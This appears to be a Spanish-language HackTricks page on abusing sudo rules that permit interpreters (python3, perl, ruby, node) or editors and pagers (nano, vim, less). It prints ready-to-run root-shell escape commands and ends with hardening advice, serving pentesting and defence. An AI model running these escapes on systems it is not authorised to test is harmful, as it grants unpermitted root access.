# Abuso de comandos Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpreters permitidos por Sudo

Si `sudo -l` permite a un usuario ejecutar un interpreter como root, trátalo como ejecución directa de código. Los interpreters están diseñados para ejecutar código arbitrario, por lo que una regla que permita `python3`, `perl`, `ruby`, `lua`, `node` u otros binarios similares suele equivaler a la ejecución de comandos como root, a menos que los argumentos estén estrictamente restringidos y validados.

Flujo común de revisión:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Otros ejemplos de intérpretes:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
La ruta exacta importa. Si la regla de sudo permite `/usr/bin/python3`, usa esa ruta exacta durante la validación:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editores permitidos por Sudo

Si `sudo -l` permite a un usuario ejecutar un editor interactivo como root, trátalo como una superficie de ejecución de comandos, no como un permiso inofensivo para editar archivos. Los editores a menudo pueden ejecutar comandos de shell, leer archivos arbitrarios, escribir archivos arbitrarios o invocar helpers externos desde el propio editor.

Flujo de revisión habitual:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Ejecución de comandos con Nano

Cuando `nano` está permitido mediante sudo, la ejecución de comandos puede estar disponible desde la interfaz del editor:
```text
Ctrl+R
Ctrl+X
```
Entonces, proporciona un comando como:
```bash
id
/bin/sh
```
En algunos terminales, un shell interactivo puede necesitar que se redirijan los streams estándar:
```bash
reset; /bin/sh 1>&0 2>&0
```
La secuencia exacta de teclas puede variar según la versión de nano y las opciones de compilación, pero el problema de seguridad es el mismo: el editor se está ejecutando como root y puede invocar comandos externos.

### Otros escapes comunes de editores

Los editores de estilo Vim suelen permitir la ejecución de comandos mediante `:!`:
```text
:!/bin/sh
```
Los paginadores como `less` también pueden permitir la ejecución de shell:
```text
!/bin/sh
```
## Notas defensivas

- Evita conceder interpreters o editores interactivos mediante sudo.
- Prefiere wrappers fijos propiedad de root que realicen una única acción administrativa específica.
- Si no se puede evitar un interpreter, restringe la ruta exacta del script y evita los argumentos controlados por el usuario, los imports escribibles, `PYTHONPATH` y la preservación insegura del entorno.
- Si se requiere editar archivos, restringe la ruta exacta del archivo y considera `sudoedit` con versiones parcheadas de sudo y un manejo estricto del entorno.
- Revisa `SETENV`, `env_keep`, los directorios de trabajo escribibles, las rutas de módulos/import escribibles, `NOEXEC`, `use_pty` y el logging, pero no los consideres un sandbox completo.
{{#include ../../banners/hacktricks-training.md}}
